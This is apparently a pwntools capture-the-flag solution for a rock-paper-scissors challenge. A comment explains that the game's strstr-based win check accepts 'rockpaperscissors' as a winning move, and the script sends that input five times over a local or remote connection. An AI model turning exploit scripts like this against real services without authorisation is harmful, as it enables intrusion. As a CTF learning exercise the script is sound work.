#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF(args.EXE or './path/to/binary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.info("""game checks for a win here:

  if (strstr(player_turn, loses[computer_turn])) {

strstr returns NULL if no match is found and a pointer if one is. it isn't checking that
the match is at the beginning of the string or anything, so

strstr(scissors, rock) == NULL but
strstr(scissorsrockpaper, rock) == (not null lol)

0/NULL is false, anything else is true - so just 'rockpaperscissors' will always win.""")

for i in range(5):
    io.sendline(b"1")
    io.sendline(b"rockpaperscissors")

io.interactive()

